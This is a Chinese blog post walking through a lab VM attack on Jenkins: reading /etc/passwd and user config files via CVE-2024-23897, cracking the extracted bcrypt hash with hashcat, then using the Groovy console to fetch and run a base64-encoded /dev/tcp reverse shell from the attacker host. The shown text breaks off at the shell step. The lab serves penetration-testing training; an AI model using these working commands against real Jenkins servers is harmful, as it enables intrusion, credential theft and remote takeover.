<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Jenkins 任意文件读取(CVE-2024-23897)&#43;后台用户密码提取哈希破解&#43;反弹Shell 一条龙 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/7fcd43aeb5a34d0f180ba68cffdc80f7/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Jenkins 任意文件读取(CVE-2024-23897)&#43;后台用户密码提取哈希破解&#43;反弹Shell 一条龙">
  <meta property="og:description" content="一、前言 本文将深入研究一项涉及Jenkins的安全漏洞（CVE-2024–23897），将在实验室中介绍这些概念，这些技能对于渗透测试期间有效管理输出至关重要，而在本次漏洞利用中，更显得尤为关键。
本文还涉及Jenkins凭证管理，针对Jenkins部署，指导参与者如何查找存储的用户和密码信息。更加刺激的是，我们将引导参与者使用Hashcat破解这些凭据，进一步揭露其中的安全挑战。
实验的一大亮点是反向Shell测试，要求学员使用Jenkins内置的Groovy脚本控制台建立反向Shell。通过一个非常典型的试错过程，参与者将亲身体验实现远程命令执行的刺激和挑战。
最后，我们将探讨权限升级，一旦shell访问得到保护，参与者将识别并利用设置了SUID位的二进制文件进行权限升级。
二、 Jenkins (CVE-2024–23897) 靶机主题 此次靶场攻击主题内容：
了解 CI / CD：参与者将从基础知识开始，了解 Jenkins 是什么及其通过持续集成/持续部署 (CI/CD)（Security&#43;
认证的基本概念）实现软件开发自动化方面的作用。 文件描述符：实验室介绍了文件描述符，重点关注 STDOUT 和
STDERR，教参与者如何操作这些流。这些知识对于有效管理渗透测试期间的输出至关重要。输出抑制和重定向：以文件描述符为基础，参与者将练习根据所涉及的文件描述符抑制和重定向输出，这是任何有抱负的渗透测试人员工具包中的一项重要技能。Jenkins 凭证：该活动针对 Jenkins 部署，指导参与者如何查找存储的用户和密码信息。 使用 Hashcat
破解密码：参与者提取凭据并使用 Hashcat 破解它们。反向Shell测试：本实验的一大亮点，本部分要求学员使用Jenkins内置的Groovy脚本控制台建立反向Shell，通过一个非常典型的试错过程来实现远程命令执行。权限升级：一旦 shell 访问得到保护，参与者将识别并利用设置了 SUID 位的二进制文件来进行权限升级，了解 SUID
位的重要性及其在类 Unix 操作系统中的作用。 三、靶机配置 下载靶机：
https://drive.google.com/file/d/1YD7fyJIjPCV3FtUfnK7UbxlMnUdrvA6X/view
下载后给靶机生成一个MAC地址：
00:50:56:3D:BD:9B 配置之后开机，你是没有密码进行登陆的所以这个不理它
我们给靶机生成过了MAC，这个需要进行定义MAC，必须也要在一个局域网里！要不然找不到
sudo arp-scan --localnet | grep 00:50:56 ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 192.168.207.132 Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-04 11:15 CST Nmap scan report for 192.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-05T17:23:01+08:00">
    <meta property="article:modified_time" content="2024-03-05T17:23:01+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Jenkins 任意文件读取(CVE-2024-23897)&#43;后台用户密码提取哈希破解&#43;反弹Shell 一条龙</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>一、前言</h2> 
<p>本文将深入研究一项涉及Jenkins的安全漏洞（CVE-2024–23897），将在实验室中介绍这些概念，这些技能对于渗透测试期间有效管理输出至关重要，而在本次漏洞利用中，更显得尤为关键。</p> 
<p>本文还涉及Jenkins凭证管理，针对Jenkins部署，指导参与者如何查找存储的用户和密码信息。更加刺激的是，我们将引导参与者使用Hashcat破解这些凭据，进一步揭露其中的安全挑战。</p> 
<p>实验的一大亮点是反向Shell测试，要求学员使用Jenkins内置的Groovy脚本控制台建立反向Shell。通过一个非常典型的试错过程，参与者将亲身体验实现远程命令执行的刺激和挑战。</p> 
<p>最后，我们将探讨权限升级，一旦shell访问得到保护，参与者将识别并利用设置了SUID位的二进制文件进行权限升级。</p> 
<h2><a id="_Jenkins_CVE202423897__8"></a>二、 Jenkins (CVE-2024–23897) 靶机主题</h2> 
<p>此次靶场攻击主题内容：</p> 
<ul><li>了解 CI / CD：参与者将从基础知识开始，了解 Jenkins 是什么及其通过持续集成/持续部署 (CI/CD)（Security+<br> 认证的基本概念）实现软件开发自动化方面的作用。 文件描述符：实验室介绍了文件描述符，重点关注 STDOUT 和<br> STDERR，教参与者如何操作这些流。这些知识对于有效管理渗透测试期间的输出至关重要。</li><li>输出抑制和重定向：以文件描述符为基础，参与者将练习根据所涉及的文件描述符抑制和重定向输出，这是任何有抱负的渗透测试人员工具包中的一项重要技能。</li><li>Jenkins 凭证：该活动针对 Jenkins 部署，指导参与者如何查找存储的用户和密码信息。 使用 Hashcat<br> 破解密码：参与者提取凭据并使用 Hashcat 破解它们。</li><li>反向Shell测试：本实验的一大亮点，本部分要求学员使用Jenkins内置的Groovy脚本控制台建立反向Shell，通过一个非常典型的试错过程来实现远程命令执行。</li><li>权限升级：一旦 shell 访问得到保护，参与者将识别并利用设置了 SUID 位的二进制文件来进行权限升级，了解 SUID<br> 位的重要性及其在类 Unix 操作系统中的作用。</li></ul> 
<h2><a id="_21"></a>三、靶机配置</h2> 
<p>下载靶机：<br> https://drive.google.com/file/d/1YD7fyJIjPCV3FtUfnK7UbxlMnUdrvA6X/view</p> 
<p>下载后给靶机生成一个MAC地址：</p> 
<pre><code class="prism language-java"><span class="token number">00</span><span class="token operator">:</span><span class="token number">50</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">3D</span><span class="token operator">:</span><span class="token constant">BD</span><span class="token operator">:</span><span class="token number">9</span>B
</code></pre> 
<p><img src="https://images2.imgbox.com/05/85/8QrupY5O_o.png" alt="在这里插入图片描述"><br> 配置之后开机，你是没有密码进行登陆的所以这个不理它<br> <img src="https://images2.imgbox.com/b5/0b/ilPYF5Lz_o.png" alt="在这里插入图片描述"><br> 我们给靶机生成过了MAC，这个需要进行定义MAC，必须也要在一个局域网里！要不然找不到</p> 
<pre><code class="prism language-powershell">sudo arp-scan <span class="token operator">--</span>localnet <span class="token punctuation">|</span> grep 00:50:56
</code></pre> 
<p><img src="https://images2.imgbox.com/1d/94/bCUwSXfy_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ nmap <span class="token operator">-</span>Pn <span class="token operator">-</span><span class="token function">sC</span> <span class="token operator">-</span><span class="token function">sV</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132
Starting Nmap 7<span class="token punctuation">.</span>94 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2024-03-04 11:15 CST
Nmap scan report <span class="token keyword">for</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132
Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00082s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
Not shown: 999 closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>18
<span class="token punctuation">|</span> http-<span class="token function">open-proxy</span>: Potentially OPEN proxy<span class="token punctuation">.</span>
<span class="token punctuation">|</span>_Methods supported:CONNECTION
<span class="token punctuation">|</span> http-robots<span class="token punctuation">.</span>txt: 1 disallowed entry 
<span class="token punctuation">|</span>_/
<span class="token punctuation">|</span>_http-server-header: Jetty<span class="token punctuation">(</span>10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>18<span class="token punctuation">)</span>
<span class="token punctuation">|</span>_http-title: Dashboard <span class="token namespace">[Jenkins]</span>

Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org/submit/ <span class="token punctuation">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 9<span class="token punctuation">.</span>61 seconds

</code></pre> 
<p><img src="https://images2.imgbox.com/96/f8/Ko6psYm1_o.png" alt="在这里插入图片描述"><br> 我们需要从靶机系统下载一个Jenkins客户端，这个客户端后面用于利用，先创建一个文件夹<br> <img src="https://images2.imgbox.com/8f/23/xVCfiDKk_o.png" alt="在这里插入图片描述"><br> 然后执行wget把<code>jenkins-cli.jar</code>提取到文件里面，如果出现错误多尝试几次，把它提取出来！</p> 
<pre><code class="prism language-powershell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span>~<span class="token operator">/</span>jenkins-exploit<span class="token punctuation">]</span>
└─$ wget http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080/jnlpJars/jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar 
<span class="token operator">--</span>2024-03-04 11:36:00-<span class="token operator">-</span>  http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080/jnlpJars/jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar
正在连接 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 已连接。
已发出 HTTP 请求，正在等待回应<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 200 OK
长度：3623400 <span class="token punctuation">(</span>3<span class="token punctuation">.</span>5M<span class="token punctuation">)</span> <span class="token namespace">[application/java-archive]</span>
正在保存至: “jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar”

jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar                 100%<span class="token punctuation">[</span>====================================================&gt;<span class="token punctuation">]</span>   3<span class="token punctuation">.</span>46M  <span class="token operator">--</span><span class="token punctuation">.</span><span class="token operator">-</span>KB/s  用时 0<span class="token punctuation">.</span>05s   

2024-03-04 11:36:00 <span class="token punctuation">(</span>67<span class="token punctuation">.</span>7 MB/s<span class="token punctuation">)</span> <span class="token operator">-</span> 已保存 “jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar” <span class="token punctuation">[</span>3623400/3623400<span class="token punctuation">]</span><span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/f1/ba/biRiIgoU_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_84"></a>四、本地文件读取漏洞</h2> 
<p>使用CLI命令测试查询在服务器上是否启用了匿名读取权限，注意IP地址需要换成你自己的！</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 help '@<span class="token operator">/</span>etc/pass
</code></pre> 
<p><img src="https://images2.imgbox.com/77/e3/qc3DwzmX_o.png" alt="在这里插入图片描述"><br> 通过Jenkins客户端的help形式成功向我们展示了/etc/passwd/文件的第一行。<br> 值得我们注意的是。此漏洞的一个关键方面是，不同的命令可以读取文件中不同数量的行数，在help情况下只返回一行。</p> 
<p>获取可用命令的完整列表：</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 help
</code></pre> 
<p><img src="https://images2.imgbox.com/4c/35/vx87DTG1_o.png" alt="在这里插入图片描述"><br> 在本实验的下一部分中，我们将编写一个脚本来测试这些命令中的每一个，以查看可以读取<code>/etc/passwd</code>中的行数。本节是shell脚本编写中一个有趣的实用练习。首先,只需将 help 命令的输出重定向到名为 <code>output.txt</code> 的文件即可。</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 help &gt; output<span class="token punctuation">.</span>txt
</code></pre> 
<p><img src="https://images2.imgbox.com/c6/d4/8n1s52az_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home/kali/jenkins-exploit<span class="token punctuation">]</span>
└─<span class="token comment"># ls                              </span>
jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar  output<span class="token punctuation">.</span>txt
                                                                                                                       
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home/kali/jenkins-exploit<span class="token punctuation">]</span>
└─<span class="token comment"># cat output.txt                  </span>
                                             
</code></pre> 
<p>output.txt 是一个空的文件夹<br> <img src="https://images2.imgbox.com/4b/10/VbrF74pW_o.png" alt="在这里插入图片描述"><br> 这是因为此处的 help 命令的输出是打印到 STDERR 而不是 STDOUT。<br> 在 Linux 系统上:</p> 
<ul><li>STDOUT与文件描述符1相关联</li><li>STDERR与文件描述符2相关联</li></ul> 
<p>当我们使用&gt;字符将输出重定向到文件时，默认情况下它会将打印的信息重定向到STDOUT或文件描述符1。</p> 
<ul><li>帮助输出将改为发送到STDERR，我们可以将STDERR（文件描述符2）输出重定到这样的文件。</li></ul> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 help 2&gt; output<span class="token punctuation">.</span>txt
</code></pre> 
<p><img src="https://images2.imgbox.com/e4/ef/mZFn4WMz_o.png" alt="在这里插入图片描述"><br> TXT文本包含了当前的两条信息</p> 
<ul><li>我们可以运行的命令</li><li>此命令的说明</li></ul> 
<p>所以下面要编写一个脚本来枚举每个可用命令来测试它将从/etc/passwd文件返回的行数，我们需要执行以下操作</p> 
<ul><li>删除包含说明的每一行</li><li>保留包含我们要测试的实际命令的每一行</li></ul> 
<p>如果打开output.txt 你会发现每个命令从行首开始2个空格，而描述始终从行首开发4个空格。<br> <img src="https://images2.imgbox.com/9d/e0/aiCzhQCn_o.png" alt="在这里插入图片描述">创建一个output2.txt的文本，直接将下面的命令给丢进去</p> 
<pre><code class="prism language-powershell"><span class="token function">add-job</span><span class="token operator">-</span>to-view
build
cancel-quiet-down
<span class="token function">clear-queue</span>
<span class="token function">connect-node</span>
console
<span class="token function">copy-job</span>
create-credentials-by-xml
create-credentials-domain-by-xml
create-job
create-node
create-view
declarative-linter
delete-builds
delete-credentials
delete-credentials-domain
delete-job
delete-node
delete-view
<span class="token function">disable-job</span>
<span class="token function">disable-plugin</span>
<span class="token function">disconnect-node</span>
<span class="token function">enable-job</span>
<span class="token function">enable-plugin</span>
<span class="token function">get-credentials</span><span class="token operator">-as</span><span class="token operator">-</span>xml
<span class="token function">get-credentials</span><span class="token operator">-</span>domain-as-xml
<span class="token function">get-gradle</span>
<span class="token function">get-job</span>
<span class="token function">get-node</span>
<span class="token function">get-view</span>
groovy
groovysh
help
<span class="token function">import-credentials</span><span class="token operator">-as</span><span class="token operator">-</span>xml
<span class="token function">install-plugin</span>
keep-build
list-changes
list-credentials
list-credentials-as-xml
list-credentials-context-resolvers
list-credentials-providers
list-jobs
list-plugins
mail
offline-node
online-node
quiet-down
reload-configuration
reload-job
<span class="token function">remove-job</span><span class="token operator">-</span><span class="token keyword">from</span><span class="token operator">-</span>view
replay-pipeline
restart
<span class="token function">restart-from</span><span class="token operator">-</span>stage
safe-restart
safe-shutdown
session-id
<span class="token function">set-build</span><span class="token operator">-</span>description
<span class="token function">set-build</span><span class="token operator">-</span>display-name
shutdown
<span class="token function">stop-builds</span>
<span class="token function">update-credentials</span><span class="token operator">-</span>by-xml
<span class="token function">update-credentials</span><span class="token operator">-</span>domain-by-xml
<span class="token function">update-job</span>
<span class="token function">update-node</span>
<span class="token function">update-view</span>
version
<span class="token function">wait-node</span><span class="token operator">-</span>offline
<span class="token function">wait-node</span><span class="token operator">-</span>online
who-am-i

</code></pre> 
<p>下面创建一个Bash 脚本，用于生成一个名为 <code>enum.sh</code> 的脚本文件。该脚本的作用是循环读取 <code>output2.txt</code> 文件中的每一行（假设这些行是 Jenkins CLI 命令），然后为每个命令生成一个输出。</p> 
<p>让我们来解释这个命令的各个部分：</p> 
<ol><li><code>cat output2.txt</code>: 读取 <code>output2.txt</code> 文件的内容。</li><li><code>while read cmd; do</code>: 使用 <code>while</code> 循环逐行读取 <code>output2.txt</code> 中的内容，并将每一行赋值给变量 <code>cmd</code>。</li><li><code>echo "echo -n \"$cmd: \"; java -jar jenkins-cli.jar -s http://192.168.207.132:8080 $cmd @'/etc/passwd' 2&gt;&amp;1 | wc -l"</code>: 为每个命令生成一个字符串，其中包含了用于执行 Jenkins CLI 命令的语法。这个字符串包含了命令本身以及将输出重定向到 <code>/etc/passwd</code> 文件，并通过 <code>wc -l</code> 命令统计行数。</li><li><code>done</code>: 结束循环。</li><li><code>&gt; enum.sh</code>: 将循环生成的字符串输出到名为 <code>enum.sh</code> 的文件中，覆盖现有的文件内容（如果文件已存在）。</li></ol> 
<p>所以，<code>enum.sh</code> 文件中的内容将包含一系列的命令，每个命令都以其原始命令为前缀，并在其后执行 Jenkins CLI 命令，并输出到 <code>/etc/passwd</code> 文件。</p> 
<pre><code class="prism language-powershell"><span class="token function">cat</span> output2<span class="token punctuation">.</span>txt <span class="token punctuation">|</span> <span class="token keyword">while</span> read cmd<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">echo</span> <span class="token string">"echo -n \"</span><span class="token variable">$cmd</span>: \<span class="token string">"; java -jar jenkins-cli.jar -s http://192.168.207.132:8080 <span class="token variable">$cmd</span> @'/etc/passwd' 2&gt;&amp;1 | wc -l"</span><span class="token punctuation">;</span> done &gt; enum<span class="token punctuation">.</span>sh
</code></pre> 
<pre><code class="prism language-powershell"><span class="token function">cat</span> enum<span class="token punctuation">.</span>sh
</code></pre> 
<p><img src="https://images2.imgbox.com/26/42/tl4JBioa_o.png" alt="在这里插入图片描述">创建完<code>enum.sh</code>看看里面有没有内容，IP是不是准确的，以防后面出问题，运行脚本前给个权限。</p> 
<pre><code class="prism language-powershell">chmod 777 enum<span class="token punctuation">.</span>sh 
<span class="token punctuation">.</span><span class="token operator">/</span>enum<span class="token punctuation">.</span>sh
</code></pre> 
<p><img src="https://images2.imgbox.com/8f/2d/OHeGl9SP_o.png" alt="在这里插入图片描述"><br> 脚本似乎按预期运行了。它执行了每个 Jenkins CLI 命令，并将输出重定向到 /etc/passwd 文件，然后通过 wc -l 统计了输出的行数。</p> 
<p>每一行的格式是 &lt;命令&gt;: &lt;行数&gt;。行数表示执行该 Jenkins CLI 命令后输出的行数。</p> 
<p>请注意，对于一些敏感的操作，例如 delete-job、delete-node、delete-view、offline-node 和 online-node，输出行数较多。这是因为这些操作可能会对 Jenkins 环境产生重大影响，输出包含了相关的信息。</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 <span class="token function">connect-node</span> <span class="token string">'@/etc/passwd'</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/92/d5/Dah4R6fe_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_Jenkins_251"></a>五 、枚举Jenkins用户、提取密码哈希值（破解）</h2> 
<p>Jenkins 安装将有一个文件，其中列出了此处的所有有效用户。</p> 
<ul><li><code>/var/jenkins_home/users/users.xml</code></li></ul> 
<p>使用 connect-node 命令读取此文件，如下所示</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 <span class="token function">connect-node</span> <span class="token string">'@/var/jenkins_home/users/users.xml'</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ed/07/agwnWED1_o.png" alt="在这里插入图片描述"><br> <code>users.xml</code>显示系统上的单个用户，<code>kyle_reese</code>，其文件夹为 <code>/var/jenkins_home/users/kylereese_12022439290147957862</code></p> 
<p>在 Jenkins 上的每个用户文件夹中，始终有一个包含用户密码哈希的<code>config.xml</code>文件。读取文件夹中的<code>config.xml</code> <code>kylereese_12022439290147957862</code>：</p> 
<pre><code class="prism language-powershell">java <span class="token operator">-</span>jar jenkins-<span class="token function">cli</span><span class="token punctuation">.</span>jar <span class="token operator">-</span>s http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>207<span class="token punctuation">.</span>132:8080 <span class="token function">connect-node</span> <span class="token string">'@/var/jenkins_home/users/kylereese_12022439290147957862/config.xml'</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ce/af/vRz5WdGP_o.png" alt="在这里插入图片描述"><br> 复制找到的密码哈希并将其粘贴到 Kali 上名为 hashes.txt 的文件中。</p> 
<pre><code class="prism language-powershell">pico hashes<span class="token punctuation">.</span>txt
</code></pre> 
<p>然后把哈希写进去</p> 
<pre><code class="prism language-powershell"><span class="token variable">$2a</span><span class="token variable">$10</span><span class="token variable">$GqneLZhOq6hRpCXeXF07tuAN</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Q8GKDv5zad/HfcpNpL8GJUNNdDO
</code></pre> 
<p>1.按下 Ctrl + O：这将会触发保存文件的操作。<br> 2.按下 Enter：确认文件名。<br> 3.按下 Ctrl + X：这将会退出 pico 编辑器。<br> <img src="https://images2.imgbox.com/73/a9/q02f0qrT_o.png" alt="在这里插入图片描述"><br> 接下来，我们将执行以下操作来破解此哈希值并确定实际密码是什么：</p> 
<ol><li> <p><code>cp /usr/share/wordlists/rockyou.txt.gz</code>：复制（<code>cp</code>）RockYou密码字典的压缩文件 <code>rockyou.txt.gz</code> 到当前目录（或者需要指定的目标目录）。</p> </li><li> <p><code>gunzip rockyou.txt.gz</code>：解压缩 <code>rockyou.txt.gz</code> 文件，将其还原为 <code>rockyou.txt</code> 文件。这一步是因为 RockYou 字典通常以 gzip 压缩的形式提供，所以需要使用 <code>gunzip</code> 命令进行解压缩。</p> </li><li> <p><code>hashcat hashes.txt rockyou.txt</code>：使用 Hashcat 工具，对名为 <code>hashes.txt</code> 的哈希文件进行破解，使用 <code>rockyou.txt</code> 字典进行密码破解攻击。这假设 <code>hashes.txt</code> 包含已经获取的密码哈希，而 <code>rockyou.txt</code> 包含可能的密码列表。</p> </li></ol> 
<pre><code class="prism language-powershell"><span class="token function">cp</span> <span class="token operator">/</span>usr/share/wordlists/rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz <span class="token punctuation">.</span>

gunzip rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz

hashcat hashes<span class="token punctuation">.</span>txt rockyou<span class="token punctuation">.</span>txt
</code></pre> 
<p>注意看截图的第一条命令，复制命令还有一个符号，没有的话会提示缺少目标文件，下面使用3200模式来破解<br> <img src="https://images2.imgbox.com/21/2f/uG7m17Yi_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">hashcat <span class="token operator">-</span>m 3200 hashes<span class="token punctuation">.</span>txt rockyou<span class="token punctuation">.</span>txt
</code></pre> 
<p>过程需要等待，因为是虚拟机给配置不高，所以等它跑完<br> <img src="https://images2.imgbox.com/b2/de/Lx2iCnoW_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/c1/67/khkurj6X_o.png" alt="在这里插入图片描述"><br> 获得密码后，您将能够使用以下命令登录 Jenkins Web 界面：</p> 
<ul><li>账号：<code>kyle_reese</code></li><li>密码：<code>mastermind</code></li></ul> 
<h2><a id="_Shell_309"></a>六、后台命令执行 反弹Shell</h2> 
<p><img src="https://images2.imgbox.com/4c/36/iYHB6LJY_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/9b/d0/hpVd3ATY_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/db/f6/5mxBrhKY_o.png" alt="在这里插入图片描述"><br> Jenkins 脚本控制台在<a href="https://www.jenkins.io/doc/book/managing/script-console/" rel="nofollow">官方用户手册</a>中可以看到可以进行命令执行<br> <img src="https://images2.imgbox.com/9e/15/f20wtGUt_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">println <span class="token string">"cat /etc/passwd"</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
</code></pre> 
<p><img src="https://images2.imgbox.com/9b/88/XIW1Uyot_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="1shell_321"></a>（1）反弹shell</h3> 
<ul><li>将反向 shell 代码放入脚本文件中。</li><li>强制 Jenkins 服务器使用 curl 之类的东西下载这个脚本</li><li>强制 Jenkins 服务器在本地执行<br> 从这里直接生成Shell https://www.revshells.com/访问不了可以访问这个https://www.ddosi.org/shell/<br> <img src="https://images2.imgbox.com/15/79/m8E5pNmZ_o.png" alt="在这里插入图片描述"></li></ul> 
<pre><code class="prism language-powershell"><span class="token function">echo</span> <span class="token operator">-</span>n <span class="token string">'/bin/sh -i &gt;&amp; /dev/tcp/192.168.207.128/9001 0&gt;&amp;1'</span> <span class="token punctuation">|</span> base64 <span class="token operator">-</span>d <span class="token punctuation">|</span> <span class="token operator">/</span>bin/bash

base一下

<span class="token function">echo</span> <span class="token operator">-</span>n <span class="token string">'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4xMjgvOTAwMSAwPiYx'</span> <span class="token punctuation">|</span> base64 <span class="token operator">-</span>d <span class="token punctuation">|</span> <span class="token operator">/</span>bin/bash
</code></pre> 
<p>在 Kali 上创建一个名为 exploit.sh 的文件，并将 base64 编码的反向 shell 代码复制到其中。</p> 
<pre><code class="prism language-powershell">pico exploit<span class="token punctuation">.</span>sh
</code></pre> 
<p>1.按下 Ctrl + O：这将会触发保存文件的操作。<br> 2.按下 Enter：确认文件名。<br> 3.按下 Ctrl + X：这将会退出 pico 编辑器。<br> <img src="https://images2.imgbox.com/35/75/hLvctCsO_o.png" alt="在这里插入图片描述"><br> 然后在目录下起个python服务<br> <img src="https://images2.imgbox.com/e3/d4/cpefIvsG_o.png" alt="在这里插入图片描述"><br> 使用 curl 命令将此文件提取到 Jenkins 服务器 /tmp 目录。</p> 
<pre><code class="prism language-powershell">println <span class="token string">"curl http://192.168.207.128:8000/exploit.sh -o /tmp/exploit.sh"</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
</code></pre> 
<p><img src="https://images2.imgbox.com/e7/88/pKNnQczx_o.png" alt="在这里插入图片描述"><br> 您应该在python服务中的日志输出中看到 Web 服务器收到了状态代码为 200 的点击。<br> 然后给Shell权限，确保文件在目标服务器上可执行：</p> 
<pre><code class="prism language-powershell">println <span class="token string">"chmod 777 /tmp/exploit.sh"</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
</code></pre> 
<p><img src="https://images2.imgbox.com/98/e0/Ikn4OZlE_o.png" alt="在这里插入图片描述"><br> Kali NC开起来<br> <img src="https://images2.imgbox.com/47/f8/pHv42QxV_o.png" alt="在这里插入图片描述"><br> 直接运行Shell，NC传回反应</p> 
